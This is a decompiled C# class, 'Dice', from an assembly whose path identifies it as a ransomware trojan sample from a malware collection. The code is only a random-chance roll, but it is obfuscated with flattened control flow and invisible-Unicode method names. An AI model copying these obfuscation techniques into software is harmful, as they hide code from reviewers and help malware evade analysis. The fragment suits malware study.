// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Dice
// Assembly: ModuleBuild, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 89F10113-88CA-4804-9B17-4A5288FD99D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2e269df5f1ed94bc3f07c434a6d33a1e48ce04fd0feb953bba71e2a8ced82875.exe

using System;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Dice
  {
    private readonly Random _random;

    public Dice()
    {
label_1:
      int num1 = -1142562282;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1157131107)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this._random = Dice.\u200B‭⁪⁭‪‏‏‪⁬⁮​‍​‏‭‮⁯‌‌⁮​‮‫⁭‮‪‎⁮‭⁭‬⁯‫⁫‫⁪‬​⁭‌‮((int) DateTime.Now.Ticks);
            num1 = (int) num2 * -948962472 ^ 465224848;
            continue;
          case 3:
            num1 = (int) num2 * 1714349594 ^ -448973607;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public bool Roll(float chance)
    {
      bool flag = Dice.\u202E‍‫‎‬‮‪⁬‬⁬⁮⁪‬‮​⁫⁮‎‪‍‫‏‎‏⁬⁫⁯⁫‍⁭⁯‏‫‍⁯⁪⁬‏⁭‬‮(this._random) <= (double) chance;
label_1:
      int num1 = 1586901027;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1005588341)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 1665347197 ^ -426191809;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    static Random \u200B‭⁪⁭‪‏‏‪⁬⁮​‍​‏‭‮⁯‌‌⁮​‮‫⁭‮‪‎⁮‭⁭‬⁯‫⁫‫⁪‬​⁭‌‮([In] int obj0) => new Random(obj0);

    static double \u202E‍‫‎‬‮‪⁬‬⁬⁮⁪‬‮​⁫⁮‎‪‍‫‏‎‏⁬⁫⁯⁫‍⁭⁯‏‫‍⁯⁪⁬‏⁭‬‮([In] Random obj0) => obj0.NextDouble();
  }
}
